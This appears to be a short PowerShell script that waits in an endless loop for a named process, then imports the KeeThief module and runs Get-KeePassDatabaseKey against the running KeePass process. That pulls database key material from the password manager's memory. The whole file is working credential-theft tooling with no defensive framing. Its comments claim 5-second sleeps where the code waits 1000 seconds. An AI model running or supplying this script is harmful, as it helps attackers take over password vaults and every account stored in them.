[CmdletBinding()]
param
(
  [Parameter(Mandatory = $true, Position = 0)]
  [System.String]
  $ProcessName = '',
    
  [Parameter(Mandatory = $true, Position = 1)]
  [System.String]
  $FilePath = ''
) 
 
# Running a neverending loop, because $true will always be $true
while ($true)
{
  If((Get-Process -Name $ProcessName -ErrorAction SilentlyContinue ))
  {
   
	#Start-Process -FilePath C:\Windows\System32\calc.exe
	Import-Module ./keethief.ps1
        Get-KeePassDatabaseKey -Verbose
        Get-Process KeePass | Get-KeePassDatabaseKey -Verbose
    
    # Sleeping the loop for 5 secs, to let the process start.
    Start-Sleep -Seconds 1000
  }
  Else
  {   
    # Sleeping the loop for 5 secs, to not max out the CPU
    Start-Sleep -Seconds 5
  }
}
